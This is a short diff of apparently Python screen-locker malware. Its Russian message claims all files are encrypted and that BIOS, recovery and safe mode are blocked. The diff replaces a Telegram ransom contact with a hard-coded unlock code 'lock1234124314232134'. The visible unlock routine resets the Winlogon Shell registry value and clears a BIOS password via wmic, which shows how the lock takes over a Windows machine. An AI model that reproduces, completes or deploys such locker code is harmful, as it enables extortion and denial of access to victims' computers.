@@ -38,11 +38,11 @@ art1 = r"""
 ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⠏⠀⠀⠀"""
 
-pas = '1234'
-tg = "your-telegramm"
+pas = 'lock1234124314232134'
+
 message = f'''Все ваши файлы были зашифрованы
 Биос, среда восстановления и безопасный режим заблокированы.
-Для получения кода напишите в телергамм: @{tg}'''
+Введите код разблокировки'''
 
 can_check = True # Don't touch, for check password
 
@@ -331,7 +331,7 @@ def unlock():
         winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe")
         winreg.CloseKey(key)
     except Exception as e:
-        messagebox.showerror("Error!", e)
+        messagebox.showerror("Error!", str(e))
 
     os.system("wmic bios set password=")
     
